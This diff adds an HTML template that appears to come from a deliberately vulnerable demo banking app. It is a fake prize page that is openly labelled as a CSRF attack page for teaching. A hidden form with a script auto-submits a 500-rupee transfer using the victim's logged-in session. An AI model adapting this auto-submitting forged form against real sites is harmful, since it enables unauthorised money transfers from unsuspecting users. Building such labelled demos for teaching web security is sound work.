@@ -1,0 +1,24 @@
+<!doctype html><html><head><meta charset="utf-8"><title>Lucky draw winner</title>
+<link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}"></head>
+<body><div class="auth-wrap" style="background:linear-gradient(135deg,#b8860b,#7a5c00)">
+<div class="auth-card" style="text-align:center">
+  <h1 style="color:#b8860b">&#127881; Congratulations!</h1>
+  <p style="font-size:1.05rem;color:#333">You've won our <b>&#8377;1,00,000 lucky draw</b>.<br>Claim your prize now!</p>
+  <div id="status" class="flash info" style="margin-top:14px">Verifying your winning ticket&hellip;</div>
+  <div class="flash err" style="margin-top:10px;text-align:left">
+    <b>&#9888; This is the attacker page (Vuln 5 - CSRF).</b> While this fake "prize" page loads, it is
+    silently submitting a transfer form to SecureBank - moving <b>&#8377;500 to an unknown account</b>
+    using your logged-in session. You never authorised any transfer. A CSRF token would block this.</div>
+  <a class="btn block" style="margin-top:16px" href="{{ url_for('dashboard') }}">Back to SecureBank</a>
+</div></div>
+<!-- the forged cross-site POST: auto-submitting form, no CSRF token, uses the victim's session -->
+<form id="csrf" action="{{ url_for('do_transfer_route') }}" method="POST" style="display:none">
+  <input name="amount" value="500"><input name="payee" value="Unknown account transfer">
+</form>
+<script>
+setTimeout(function(){
+  document.getElementById('status').innerHTML='&#8377;500 is being transferred from your account&hellip;';
+  document.getElementById('csrf').submit();
+}, 1500);
+</script>
+</body></html>
